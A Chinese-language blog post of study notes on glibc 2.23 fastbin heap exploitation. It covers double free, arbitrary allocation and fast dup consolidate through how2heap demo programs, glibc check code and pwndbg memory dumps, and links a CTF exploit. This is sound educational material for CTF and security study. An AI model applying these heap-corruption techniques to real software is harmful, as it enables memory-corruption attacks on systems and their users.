---
layout: post
title: Fastbin Attack
subheading: glibc 2.23
author: dayfly
categories: notes
banner:
  video: null
  loop: true
  volume: 1
  start_at: 8.5
  image: https://images.pexels.com/photos/326055/pexels-photo-326055.jpeg
  opacity: 1
  background: "#000"
  height: "100vh"
  min_height: "38vh"
  heading_style: "font-size: 5em; font-weight: bold; text-decoration: none; min-width: 1100px"
  subheading_style: "color: gold"
tags: [heap, fastbin, double free]
# sidebar: []
---

## 介绍

`fastbin attack` 是指所有基于 `fastbin` 机制的漏洞利用方法。这类利用的前提是：

- 存在`堆溢出`、`use-after-free` 等能控制 chunk 内容的漏洞
- 漏洞发生于 fastbin 类型的 chunk 中

 fastbin attack 具体有以下几个分类：

- `Fastbin Double Free`
- `House of Spirit`
- `Arbitrary Alloc`

其中，前两种主要漏洞侧重于利用 free 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，第三种侧重于故意修改 **`fd`** 指针，直接利用 **malloc** 申请指定位置 chunk 进行攻击。

## 原理

fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。

## Fastbin Double Free

Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。其效果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块。

Fastbin Double Free 能够成功利用主要有两部分的原因

- fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空, 因此不会释放完就合并
- fastbin 在执行 free(实际是`_int_free`) 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。

`_int_free` 中对 fastbin double free 的检查

```c
/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto errout;
}
```

这里直接拿[how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup.c)上的实例来分析

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
  fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

  fprintf(stderr, "Allocating 3 buffers.\n");
  int *a = malloc(8);
  int *b = malloc(8);
  int *c = malloc(8);

  fprintf(stderr, "1st malloc(8): %p\n", a);
  fprintf(stderr, "2nd malloc(8): %p\n", b);
  fprintf(stderr, "3rd malloc(8): %p\n", c);

  fprintf(stderr, "Freeing the first one...\n");
  free(a);

  fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
  // free(a);

  fprintf(stderr, "So, instead, we'll free %p.\n", b);
  free(b);

  fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
  free(a);

  fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
  a = malloc(8);
  b = malloc(8);
  c = malloc(8);
  fprintf(stderr, "1st malloc(8): %p\n", a);
  fprintf(stderr, "2nd malloc(8): %p\n", b);
  fprintf(stderr, "3rd malloc(8): %p\n", c);

  assert(a == c);
}
```

首先执行 malloc(8) 申请得到三个大小为 0x20 的堆块
```
int *a = malloc(8);
int *b = malloc(8);
int *c = malloc(8);

Allocating 3 buffers.
1st malloc(8): 0x405010
2nd malloc(8): 0x405030
3rd malloc(8): 0x405050

0x405000:       0x0000000000000000      0x0000000000000021    ----> chunk 0
0x405010:       0x0000000000000000      0x0000000000000000    
0x405020:       0x0000000000000000      0x0000000000000021    ----> chunk 1
0x405030:       0x0000000000000000      0x0000000000000000
0x405040:       0x0000000000000000      0x0000000000000021    ----> chunk 2
0x405050:       0x0000000000000000      0x0000000000000000
0x405060:       0x0000000000000000      0x0000000000020fa1    ----> top chunk
```

释放 chunk 0
```
fprintf(stderr, "Freeing the first one...\n");
free(a);

Freeing the first one...

pwndbg> fastbin
fastbins
0x20: 0x405000 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
``` 

如果我们直接再次释放 chunk 0, _int_free 会报错，原因之前也提到了是因为 _int_free 有一个对 bin 头部的简单检查
```
Freeing the first one...
If we free 0x7c4010 again, things will crash because 0x7c4010 is at the top of the free list.
*** Error in `./fir_err': double free or corruption (fasttop): 0x00000000007c4010 ***
======= Backtrace: =========
/glibc/buuoj-libc/2.23-amd64/libc.so.6(+0x777e5)[0x7f07f2c8e7e5]
/glibc/buuoj-libc/2.23-amd64/libc.so.6(+0x8037a)[0x7f07f2c9737a]
/glibc/buuoj-libc/2.23-amd64/libc.so.6(cfree+0x4c)[0x7f07f2c9b53c]
./fir_err[0x4012e4]
/glibc/buuoj-libc/2.23-amd64/libc.so.6(__libc_start_main+0xf0)[0x7f07f2c37830]
./fir_err[0x4010fe]
``` 

但是如果我们再释放一个同样大小的 fastbin chunk，就能改变 bin 头部记录的chunk 指针，从而绕过这个检查

继续执行，释放 chunk 1
```
fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
// free(a);
fprintf(stderr, "So, instead, we'll free %p.\n", b);
free(b);

If we free 0x405010 again, things will crash because 0x405010 is at the top of the free list.
So, instead, we'll free 0x405030.

pwndbg> fastbin
fastbins
0x20: 0x405020 —▸ 0x405000 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0x405000
Size: 0x21
fd: 0x00

Free chunk (fastbins) | PREV_INUSE
Addr: 0x405020
Size: 0x21
fd: 0x405000

Allocated chunk | PREV_INUSE
Addr: 0x405040
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x405060
Size: 0x20fa1

pwndbg>
```

再次释放 chunk 0，double free
```
fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
free(a);

Now, we can free 0x405010 again, since it's not the head of the free list.

pwndbg> fastbins
fastbins
0x20: 0x405000 —▸ 0x405020 ◂— 0x405000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg> x/20gx 0x405000
0x405000:       0x0000000000000000      0x0000000000000021    ----> chunk 0
0x405010:       0x0000000000405020      0x0000000000000000    ----> fd = 0x405020
0x405020:       0x0000000000000000      0x0000000000000021    ----> chunk 1
0x405030:       0x0000000000405000      0x0000000000000000    ----> fd = 0x405000
0x405040:       0x0000000000000000      0x0000000000000021    ----> chunk 2
0x405050:       0x0000000000000000      0x0000000000000000
0x405060:       0x0000000000000000      0x0000000000020fa1    ----> top chunk
```

执行三次 malloc, 从 fastbin 上申请 chunk，现在 指针 `a` 和 `c` 指向的已经是同一个堆块了
```
fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
a = malloc(8);
b = malloc(8);
c = malloc(8);
fprintf(stderr, "1st malloc(8): %p\n", a);
fprintf(stderr, "2nd malloc(8): %p\n", b);
fprintf(stderr, "3rd malloc(8): %p\n", c);

Now the free list has [ 0x405010, 0x405030, 0x405010 ]. If we malloc 3 times, we'll get 0x405010 twice!
1st malloc(8): 0x405010
2nd malloc(8): 0x405030
3rd malloc(8): 0x405010
```

需要注意的是，我们通过 malloc 函数申请 fast bin chunk 时，`_int_malloc` 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。

```
*(a-2) = 0x41;
c = malloc(8);

pwndbg> x/20gx 0x405000
0x405000:       0x0000000000000000      0x0000000000000041    ----> change size to 0x41
0x405010:       0x0000000000405020      0x0000000000000000
0x405020:       0x0000000000000000      0x0000000000000021
0x405030:       0x0000000000405000      0x0000000000000000
0x405040:       0x0000000000000000      0x0000000000000021
0x405050:       0x0000000000000000      0x0000000000000000
0x405060:       0x0000000000000000      0x0000000000020fa1
pwndbg> fastbins
fastbins
0x20: 0x405020 —▸ 0x405000 ◂— 0x405020 /* ' P@' */
0x30: 0x0
0x40: 0x0

*** Error in `/home/hyh/Desktop/buuoj/fastbin/fir_err': malloc(): memory corruption (fast): 0x0000000000405010 ***
======= Backtrace: =========
/glibc/buuoj-libc/2.23-amd64/libc.so.6(+0x777e5)[0x7ffff7a847e5]
/glibc/buuoj-libc/2.23-amd64/libc.so.6(+0x82651)[0x7ffff7a8f651]
/glibc/buuoj-libc/2.23-amd64/libc.so.6(__libc_malloc+0x54)[0x7ffff7a91184]
/home/hyh/Desktop/buuoj/fastbin/fir_err[0x401393]
/glibc/buuoj-libc/2.23-amd64/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d830]
/home/hyh/Desktop/buuoj/fastbin/fir_err[0x4010fe]
```

对应的`_int_malloc`检查如下
```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
    {
      errstr = "malloc(): memory corruption (fast)";
    errout:
      malloc_printerr (check_action, errstr, chunk2mem (victim));
      return NULL;
}
```

### 效果

通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域。
如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过`_int_malloc`验证)，这就相当于任意地址写任意值的效果。

## Arbitrary Alloc

**关键**：任意地址写的本质也是由于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。

该技术的核心点在于
- 目标地址 size 域合法，这个 size 域是构造的，还是本身存在的都无妨
- **劫持** fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配任意地址，从而实现泄露或控制该地址的一些关键数据，如`__malloc_hook`。

只要满足目标地址存在合法的 size，我们就可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。

```
fprintf(stderr, "Now we change the fd at the top of free list!\n");
*a = *a - 0x20;
fprintf(stderr, "Now we can get the chunk at %p forever !\n", a);
fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));

Now we change the fd at the top of free list!
Now we can get the chunk at 0x405010 forever !
1st malloc(8): 0x405010
2nd malloc(8): 0x405010
3rd malloc(8): 0x405010

pwndbg> fastbins
fastbins
0x20: 0x405000 ◂— 0x405000
0x30: 0x0
pwndbg> x/20gx 0x405000
0x405000:       0x0000000000000000      0x0000000000000021    ----> chunk 0
0x405010:       0x0000000000405000      0x0000000000000000
0x405020:       0x0000000000000000      0x0000000000000021    ----> chunk 1
0x405030:       0x0000000000405000      0x0000000000000000
0x405040:       0x0000000000000000      0x0000000000000021    ----> chunk 2
0x405050:       0x0000000000000000      0x0000000000000000
0x405060:       0x0000000000000000      0x0000000000020fa1    ----> top chunk
```

## 2017 0ctf babyheap

[利用](https://github.com/huyinhao/ctf-buuoj/blob/main/fastbin/babyheap_0ctf_2017/exp.py)

## Fast Dup Consolidate

**待补充!!** 

当分配 large chunk时， _int_malloc 会调用 malloc_consolidate 尝试将空闲的 fastbin chunk 进行合并，来提高内存的利用率，减少内存碎片化的问题。

这些 fastbin chunk 会被合并到 unsorted bin 或者 top chunk，此时 fastbin 数组头部为空，即使再次 free 某个 fast bin chunk 时也不会触发 _int_free 检测，造成 double free 。

malloc_consolidate 大致可以分为以下几步：
1. 若 get_max_fast() 返回 0，则进行堆的初始化工作，然后进入第 7 步
2. 从 fastbin 中获取一个空闲 chunk
3. 尝试向后合并
4. 若向前相邻 top_chunk，则直接合并到 top_chunk，然后进入第 6 步
5. 否则尝试向前合并后，插入到 unsorted_bin 中
6. 获取下一个空闲 chunk，回到第 2 步，直到所有 fastbin 清空后进入第 7 步
7. 退出函数

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

void main() {
	// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8
	puts("This is a powerful technique that bypasses the double free check in tcachebin.");
	printf("Fill up the tcache list to force the fastbin usage...\n");

	void* p1 = calloc(1,0x40);

	printf("Allocate another chunk of the same size p1=%p \n", p1);
	printf("Freeing p1 will add this chunk to the fastbin list...\n\n");
	free(p1);

	void* p3 = malloc(0x400);
	printf("Allocating a tcache-sized chunk (p3=%p)\n", p3);
	printf("will trigger the malloc_consolidate and merge\n");
	printf("the fastbin chunks into the top chunk, thus\n");
	printf("p1 and p3 are now pointing to the same chunk !\n\n");

	assert(p1 == p3);

	printf("Triggering the double free vulnerability!\n\n");
	free(p1);

	void *p4 = malloc(0x400);

	assert(p4 == p3);

	printf("The double free added the chunk referenced by p1 \n");
	printf("to the tcache thus the next similar-size malloc will\n");
	printf("point to p3: p3=%p, p4=%p\n\n",p3, p4);
}
```

## Reference

- [Fastbin Attack][1]
- [babyheap2017][2]


  [1]: https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/
  [2]: https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html